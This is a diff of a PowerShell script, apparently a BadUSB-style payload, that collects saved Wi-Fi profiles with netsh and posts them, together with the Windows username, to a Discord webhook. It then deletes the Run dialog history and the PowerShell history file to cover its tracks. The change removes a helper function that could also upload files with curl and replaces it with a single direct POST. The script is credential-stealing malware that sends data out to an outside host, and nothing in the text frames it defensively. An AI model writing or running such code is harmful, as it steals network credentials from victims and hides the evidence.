@@ -7,33 +7,17 @@ $wifiProfiles_IT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$nam
 
 
 
-function Upload-Discord {
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
 $hookurl = "$dc"
 $Body = @{
-  'username' = $env:username
-  'content' = $text
+  'username' = $env:username 
+  'content' = "Ita: $wifiProfiles_IT <br> Eng: $wifiProfiles_EN <br> . <br>"
 }
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
-}
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "Ita: $wifiProfiles_IT"}
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "Eng: $wifiProfiles_EN"}
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "."}
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
 
 
 # Delete run box history
-
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete powershell history
-
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 
